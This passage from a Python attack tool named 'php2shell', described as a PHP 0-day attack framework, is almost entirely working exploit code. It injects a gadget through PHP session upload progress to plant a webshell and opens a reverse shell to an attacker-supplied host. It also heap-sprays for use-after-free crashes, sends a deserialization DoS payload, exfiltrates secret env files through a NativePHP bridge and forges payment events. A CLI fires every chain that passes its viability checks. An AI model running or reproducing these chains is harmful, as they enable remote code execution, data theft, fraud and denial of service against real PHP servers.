          f"(window 0x{window[0]:x}-0x{window[1]:x}, then full chunk)")
    t0 = time.time()
    hit, base, out, disc = sweep_chain(
        runner, workdir, script, window, arg2, marker, maps_path,
        chain_key, args.verbose, args.max_tries)
    dt = time.time() - t0
    if hit:
        receipt = (runner.read_file(marker) or "").strip()
        print(f"[+] === {chain_key}: FULL RCE === freed-block base 0x{base:x} "
              f"({dt:.0f}s sweep)")
        print(f"[+] RECEIPT: {receipt}")
        return 0
    print(f"[-] {chain_key}: {out} ({dt:.0f}s)")
    print("[-] if this is an unreceipted build the layout may sit outside "
          "the sweep; try --max-tries 2000")
    return 1


def fire_sessgap(recon, args):
    """zero1 session-gap chain: rfc1867 key injection (php_serialize write
    side) -> php read side unserializes the injected gadget -> destructor
    writes a webshell into the docroot -> optional detached revshell."""
    base = args.target.rstrip("/")
    gadget = args.gadget_class
    docroot = args.docroot.rstrip("/") if args.docroot else None
    lhost, lport = args.lhost, args.lport
    shell_name = args.shell_name or "p2s_shell.php"
    if not docroot:
        print("[-] sessgap needs --docroot (where the gadget's file-write "
              "lands, e.g. /var/www/html) — discover via an LFI/info leak or "
              "the app's upload path")
        return 2
    shell_path = f"{docroot}/{shell_name}"
    inj = build_gadget_injection(gadget, {"path": shell_path,
                                          "data": WEBSHELL})
    print(f"[*] gadget injection ({len(inj)}B) -> writes {shell_path}")

    host_port = re.sub(r"^https?://", "", base)
    host, _, port = host_port.partition(":")
    port = int(port) if port.isdigit() else (443 if base.startswith("https") else 80)
    endpoint = args.endpoint or "/up.php"
    sid = args.session_id or "p2s" + "0" * 27

    # stage 1: poisoned upload-progress upload. With cleanup=0 the key
    # persists at FILE_START, so a full-body POST works (and urllib handles
    # https targets — tunnels, proxies, real deployments).
    filedata = b"A" * (1024 * 1024)
    fields = [("PHP_SESSION_UPLOAD_PROGRESS", inj), ("PHPSESSID", sid)]
    body = multipart_body(fields, [("f", "notes.txt", filedata)])
    st, rb, rh, dt = http_req(
        base + endpoint, data=body,
        headers={"Cookie": f"PHPSESSID={sid}",
                 "Content-Type": "multipart/form-data; boundary=P2Sbound2026"},
        timeout=60)
    print(f"[1] upload (key injection): HTTP {st} ({dt:.2f}s)")
    time.sleep(1)

    # stage 2: session READ with the divergent handler -> gadget fires
    read_ep = args.read_endpoint or "/read.php"
    st, rb, rh, dt = http_req(base + read_ep,
                              headers={"Cookie": f"PHPSESSID={sid}"})
    print(f"[2] read side ({read_ep}): {st} — gadget destructor should have "
          f"written the shell")

    # stage 3: verify webshell
    shell_url = base + "/" + shell_name
    st, rb, rh, dt = http_req(shell_url + "?c=id")
    if st == 200 and b"uid=" in rb:
        print(f"[+] WEBSHELL LIVE at {shell_url}")
        print(f"[+] RECEIPT: {rb.decode('utf-8','replace').strip()}")
    else:
        print(f"[-] shell not reachable ({st}) — gadget class or handler "
              f"divergence absent on target; response: "
              f"{rb[:200].decode('utf-8','replace')!r}")
        return 1

    # stage 4: revshell (optional)
    if lhost and lport:
        listener = Listener(lhost, lport, "/tmp/p2s_sessgap.log")
        listener.start()
        time.sleep(0.5)
        rev = REVSH_BASH.format(lh=lhost, lp=lport) if args.revsh == "bash" \
            else REVSH_NC.format(lh=lhost, lp=lport)
        st, rb, _, _ = http_req(shell_url + "?" + urllib.parse.urlencode(
            {"c": rev}), timeout=15)
        print(f"[3] revshell delivery: {st}; waiting for callback...")
        listener.join(timeout=60)
        log = open("/tmp/p2s_sessgap.log").read()
        print("==== LIVE SESSION ====")
        print(log)
        if "uid=" in log:
            print("[+] RECEIPT: interactive shell through the session-gap "
                  "chain")
            return 0
        print("[-] no callback captured")
        return 1
    return 0


def fire_uprog(recon, args):
    """rfc1867 upload-progress UAF arms (CVE-2026-109618/19 fire shapes):
    kill manifests against unpatched victims."""
    import struct as _s
    base = args.target.rstrip("/")
    host_port = re.sub(r"^https?://", "", base)
    host, _, port = host_port.partition(":")
    port = int(port) if port.isdigit() else 80
    endpoint = args.endpoint or "/wp-login.php"
    sid = args.session_id or "wp0123456789abcdefghijklmnopqrstu"
    spray_len = 8208 - 24 - 1
    mark = 0x4141414141414141
    z = _s.pack("<QII", mark, 8, 0)
    spray = (z * (spray_len // 16))[:spray_len]
    small = _s.pack("<QII", mark, 8, 0) + b"\x00" * 8

    def part(name, value, filename=None):
        d = b'Content-Disposition: form-data; name="' + name + b'"'
        if filename:
            d += b'; filename="' + filename + b'"'
        return b"--P2Sarm2026\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

    def body_for(n_spray, n_small=600):
        o = part(b"PHPSESSID", sid.encode())
        o += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
        for _ in range(n_spray):
            o += part(b"s[]", spray)
        for _ in range(n_small):
            o += part(b"t[]", small)
        o += part(b"f", b"A" * 6144, filename=b"a")
        o += part(b"g", b"B" * 6144, filename=b"b")
        return o + b"--P2Sarm2026--\r\n"

    shapes = [int(x) for x in (args.shapes or "150,250,350,450").split(",")]
    bodies = {n: body_for(n) for n in shapes}
    print(f"[*] uprog arms at {endpoint} (shapes {shapes}, "
          f"{args.rounds} rounds)")
    for i in range(args.rounds):
        n = shapes[i % len(shapes)]
        code, resp = raw_post(host, port, endpoint, {
            "Cookie": f"PHPSESSID={sid}",
            "Content-Type": "multipart/form-data; boundary=P2Sarm2026"},
            bodies[n], timeout=25)
        print(f"    arm#{i} fs={n} -> {code}")
        if code in ("EMPTY", "NOHTTP") or code.startswith(("CONN", "RECV")):
            print(f"[+] KILL SIGNATURE at arm#{i}: {code} — worker died "
                  f"mid-request (the UAF manifest)")
            return 0
        if code == "500" and b"Allowed memory size" not in resp:
            print(f"[+] 500 at arm#{i} — child crash signature (verify worker "
                  "recycling server-side)")
            return 0
        if code == "500":
            print(f"    (500 = memory_limit OOM, not the UAF — continuing)")
    print("[-] no kill signature in budget — target patched or shapes need "
          "tuning (jammy fleet + <=8.5.11 vanilla are the receipted classes)")
    return 1


def fire_cformat(recon, args):
    """zero7: C: custom-object format crasher (crash/DoS receipt)."""
    base = args.target.rstrip("/")
    gadget = args.gadget_class
    payload = f"C:{len(gadget)}:\"{gadget}\":0:{{}}"
    field = args.field or "data"
    url = base + (args.endpoint or "/import.php")
    body = urllib.parse.urlencode({field: payload}).encode()
    st, rb, rh, dt = http_req(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded"})
    print(f"[*] C: crasher ({gadget}) -> {st} ({dt:.2f}s) "
          f"{rb[:200].decode('utf-8','replace')!r}")
    if st == 500 or st is None:
        print("[+] crash manifest (500 / conn death)")
        return 0
    print("[-] no crash signature — target class/layout differs")
    return 1


def fire_nativephp(recon, args):
    """zero6 NativePHP bridge chain: upload -> File.Copy raw-path -> spool
    poison -> AsyncTask.Dispatch -> runner unserialize."""
    base = args.native_bridge.rstrip("/") if args.native_bridge else \
        (args.target.rstrip("/") if args.target else None)
    if not base:
        print("[-] nativephp needs --native-bridge URL")
        return 2
    mode = args.nphp_mode or "trigger"
    gadget = args.gadget_class

    def post(path, data=None, headers=None, raw=False):
        url = base + path
        body = data if raw else urllib.parse.urlencode(data, doseq=True).encode()
        return http_req(url, data=body, headers=headers)

    def bridge(method, params):
        d = {"method": method}
        for k, v in params.items():
            d[f"params[{k}]"] = v
        return post("/_native/api/call", d)

    task_id = "p2s-" + socket.gethostname()[:8] + str(int(time.time()))[-8:]

    if mode == "exfil":
        src = args.nphp_file or "storage/app/secret.env"
        print(f"[*] exfil mode: File.Copy {src} -> public/")
        st, rb, _, _ = bridge("File.Copy", {"from": src,
                                            "to": "public/p2s_leak.txt"})
        print(f"    File.Copy: {st} {rb[:160].decode('utf-8','replace')!r}")
        st, rb, _, _ = http_req(base + "/_assets/p2s_leak.txt")
        if st == 200:
            print(f"[+] EXFILTRATED: {rb[:500].decode('utf-8','replace')}")
            return 0
        print("[-] read-back failed")
        return 1

    if mode == "events":
        ev = args.nphp_event or "App\\Events\\PaymentCompleted"
        payload = json.dumps({"event": ev, "payload": {
            "orderId": "P2S-FORGED", "amount": 0.01}}).encode()
        st, rb, _, _ = post("/_native/api/events", payload,
                            {"Content-Type": "application/json"}, raw=True)
        print(f"[*] event forgery ({ev}): {st} "
              f"{rb[:200].decode('utf-8','replace')!r}")
        return 0 if st == 200 else 1

    # default: the spool-poison trigger (VD UAF through the full delivery)
    payload = build_trigger(gadget, marker=args.marker_trigger)
    print(f"[*] bridge chain: upload({len(payload)}B) -> File.Copy -> "
          f"AsyncTask.Dispatch (gadget {gadget})")
    st, rb, _, _ = post("/upload", payload.encode(),
                        {"X-Filename": "user-content.bin"}, raw=True)
    print(f"[1] upload: {st} {rb[:160].decode('utf-8','replace')!r}")
    if st != 200:
        print("[-] upload endpoint missing (any app file-save feature works)")
        return 1
    try:
        up_path = json.loads(rb)["path"]
    except Exception:
        return 1
    spool = args.spool_path.replace("{id}", task_id) if args.spool_path else \
        f"storage/framework/async/payload/{task_id}.task"
    st, rb, _, _ = bridge("File.Copy", {"from": up_path, "to": spool})
    print(f"[2] File.Copy -> {spool}: {st} "
          f"{rb[:160].decode('utf-8','replace')!r}")
    st, rb, _, _ = bridge("AsyncTask.Dispatch", {"id": task_id})
    print(f"[3] AsyncTask.Dispatch: {st}")
    try:
        data = json.loads(rb)["data"]
        code = data.get("runner_exit")
        out = (data.get("runner_out") or "")[:1500]
        print(f"[*] runner_exit={code}")
        print(out)
        if code not in (0, None):
            sig = {139: "SIGSEGV", 134: "SIGABRT"}.get(code, "signal")
            print(f"[+] runner lane died mid-unserialize ({sig}) — UAF "
                  f"manifest through the full framework delivery")
            return 0
        if "SURVIVED" in out:
            print("[*] runner survived: gadget did not re-enter unserialize "
                  "(class absent or silent-corruption ZendMM)")
    except Exception:
        pass
    return 0


# ============================================================================
# Chain registry
# ============================================================================

def _vt(recon, args):
    return version_tuple(args.version or recon.get("version") or "0.0.0")


CHAINS = [
    {
        "key": "sessgap",
        "name": "session serialize_handler gap -> key injection -> gadget -> webshell -> revshell",
        "family": "zero1 (CVE-2026-115560-class config differential)",
        "modes": ("remote",),
        "viable": lambda rc, a: (
            True,
            "fires on ANY PHP version given the write/read handler divergence "
            "+ an app destructor gadget (this is an app-config bug class, not "
            "a memory bug)"),
        "fire": fire_sessgap,
    },
    {
        "key": "zero4",
        "name": "var_destroy re-entry UAF -> reclaim -> forged zval -> zif_system",
        "family": "unserialize-side UAF (CWE-416), plain unserialize()",
        "modes": ("local", "docker"),
        "viable": lambda rc, a: (
            _vt(rc, a) != (0, 0, 0) and _vt(rc, a) <= (8, 5, 12) and _vt(rc, a) >= (8, 1, 0),
            f"PHP {a.version or rc.get('version')} in the receipted range "
            f"8.1 - 8.5.12 (var layer unpatched through 8.5.12; receipts: "
            f"vanilla-docker 8.5.11/8.3.36, jammy 8.1.2-1ubuntu2.27, "
            f"php.net 8.5.12)")
            if rc.get("zif_offset") and rc.get("setarch")
            else (False, "needs zif_system extraction + ASLR-off (setarch)"),
        "fire": lambda rc, a: fire_local_chain(rc["runner"], rc, a, "zero4"),
    },
    {
        "key": "zero5",
        "name": "serialize-side mirror UAF -> groom self-reclaim -> dtor_obj=zif_system",
        "family": "serialize-side UAF, plain serialize()",
        "modes": ("local", "docker"),
        "viable": lambda rc, a: (
            (8, 2, 0) <= _vt(rc, a) <= (8, 5, 12),
            f"PHP {a.version or rc.get('version')} — receipted on the 8.5.x "
            f"line (8.5.11/8.5.12); fixed upstream only after 8.5.12; "
            f"8.1-8.3 share the var.c code but the reclaim is receipted on "
            f"8.5 — use zero4 there)")
            if rc.get("zif_offset") and rc.get("setarch")
            else (False, "needs zif_system extraction + ASLR-off (setarch)"),
        "fire": lambda rc, a: fire_local_chain(rc["runner"], rc, a, "zero5"),
    },
    {
        "key": "uprog",
        "name": "rfc1867 upload-progress UAF arms (kill manifests)",
        "family": "CVE-2026-109618/19 fire shapes (Oct-2026 patch absent)",
        "modes": ("remote",),
        "viable": lambda rc, a: (
            _vt(rc, a) <= (8, 5, 12),
            f"PHP {a.version or rc.get('version') or '?'} <= 8.5.12 without "
            f"the Oct-2026 patch (jammy 8.1.2-1ubuntu2.27 fleet + <=8.5.11 "
            f"vanilla receipted; 8.3.36+/8.4.27+ have the patch)"),
        "fire": fire_uprog,
    },
    {
        "key": "cformat",
        "name": "C: format internal-class crasher",
        "family": "zero7 (crash/DoS)",
        "modes": ("remote",),
        "viable": lambda rc, a: (
            True, "crash/DoS class — needs an unserialize endpoint on target"),
        "fire": fire_cformat,
    },
    {
        "key": "nativephp",
        "name": "NativePHP bridge: File.Copy -> AsyncTask spool poison -> unserialize",
        "family": "zero6 (framework bridge holes + VD UAF)",
        "modes": ("remote",),
        "viable": lambda rc, a: (
            bool(a.native_bridge),
            "needs --native-bridge URL (the /_native/api/* surface)"),
        "fire": fire_nativephp,
    },
    {
        "key": "win-sess",
        "name": "Windows session O_NOFOLLOW=0 file truncation",
        "family": "zero9",
        "modes": ("remote",),
        "viable": lambda rc, a: (
            False, "Windows victims only — this target is not Windows"),
        "fire": None,
    },
]


# ============================================================================
# CLI
# ============================================================================

def main():
    p = argparse.ArgumentParser(
        description="php2shell — unified PHP 0-day attack framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("EXAMPLES")[-1] if "EXAMPLES" in __doc__ else None)
    p.add_argument("--target", help="remote base URL")
    p.add_argument("--local", action="store_true", help="local binary target")
    p.add_argument("--docker", help="docker container target (vanilla images)")
    p.add_argument("--php", default=None,
                   help="php binary path (local mode; docker default "
                        "/usr/local/bin/php)")
    p.add_argument("--chain", help="chain key to fire (post-recon); "
                                   "see --list-chains")
    p.add_argument("--all", action="store_true",
                   help="fire every VIABLE chain")
    p.add_argument("--list-chains", action="store_true")
    p.add_argument("--cmd", default="id", help="receipt command (default id)")
    p.add_argument("--version", help="override version fingerprint")
    # sessgap
    p.add_argument("--gadget-class", default="DeferredWriter",
                   help="app destructor gadget class name on the target")
    p.add_argument("--docroot", help="target docroot (sessgap webshell path)")
    p.add_argument("--endpoint", help="write-side endpoint (default /up.php)")
    p.add_argument("--read-endpoint", dest="read_endpoint",
                   help="read-side endpoint (default /read.php)")
    p.add_argument("--session-id", dest="session_id")
    p.add_argument("--shell-name", dest="shell_name")
    p.add_argument("--lhost", "--revsh-host", dest="lhost")
    p.add_argument("--lport", "--revsh-port", type=int, dest="lport")
    p.add_argument("--revsh", choices=("bash", "nc"), default="bash",
                   help="revshell payload flavor (bash=/dev/tcp, nc=fifo)")
    # uprog
    p.add_argument("--shapes", help="uprog spray shapes (150,250,350,450)")
    p.add_argument("--rounds", type=int, default=40)
    # generic remote
    p.add_argument("--field", help="form field for payload delivery")
    p.add_argument("--marker-trigger", action="store_true")
    p.add_argument("--payload-file", help="deliver a pre-built payload")
    p.add_argument("--timeout", type=int, default=30)
    # nativephp
    p.add_argument("--native-bridge", metavar="URL")
    p.add_argument("--nphp-mode", choices=("trigger", "exfil", "events"))
    p.add_argument("--nphp-file", help="exfil source (relative to app)")
    p.add_argument("--nphp-event", help="event class to forge")
    p.add_argument("--spool-path", help="async spool template ({id})")
    # local sweep
    p.add_argument("--max-tries", type=int, default=900)
    p.add_argument("--verbose", "-v", action="store_true")
    a = p.parse_args()

    if a.list_chains:
        for i, c in enumerate(CHAINS, 1):
            print(f"  [{c['key']}] {c['name']}")
            print(f"        family: {c['family']}  modes: {','.join(c['modes'])}")
        return 0

    runner = None
    recon = {"version": a.version}
    if a.local:
        php = a.php or "/usr/bin/php"
        runner = LocalRunner(php, verbose=a.verbose)
    elif a.docker:
        runner = DockerRunner(a.docker, a.php or "/usr/local/bin/php",
                              verbose=a.verbose)
    elif a.target or a.native_bridge:
        recon["remote"] = True
    else:
        p.print_help()
        return 2

    print(f"php2shell {VERSION} — recon")
    print("=" * 60)
    if runner:
        recon.update(recon_local(runner, a))
        recon["runner"] = runner
    elif a.target:
        recon.update(recon_remote(a.target))

    print("=" * 60)
    print("CHAINS (post-recon viability for this target):")
    viable_keys = []
    for i, c in enumerate(CHAINS, 1):
        mode_ok = (("local" in c["modes"] or "docker" in c["modes"])
                   if runner else ("remote" in c["modes"]))
        if not mode_ok:
            print(f"  [{c['key']:9s}] N/A      (not a "
                  f"{'binary' if runner else 'remote'} target)")
            continue
        ok, why = c["viable"](recon, a)
        tag = "VIABLE " if ok else "NOT     "
        print(f"  [{c['key']:9s}] {tag} {c['name']}")
        print(f"        -> {why}")
        if ok:
            viable_keys.append(c["key"])
    print("=" * 60)

    if a.chain:
        keys = [a.chain]
    elif a.all:
        keys = viable_keys
    else:
        if not sys.stdin.isatty():
            print("[*] pick with --chain <key> (or --all for every VIABLE)")
            return 0
        pick = input("[pick] chain key (or 'all'): ").strip()
        keys = viable_keys if pick == "all" else [pick]
    rc = 0
    for k in keys:
        c = next((x for x in CHAINS if x["key"] == k), None)
        if not c:
            print(f"[-] unknown chain {k} (--list-chains)")
            return 2
        print(f"\n=== FIRE: [{c['key']}] {c['name']} ===")
        rc |= c["fire"](recon, a)
    return rc


if __name__ == "__main__":
    sys.exit(main())
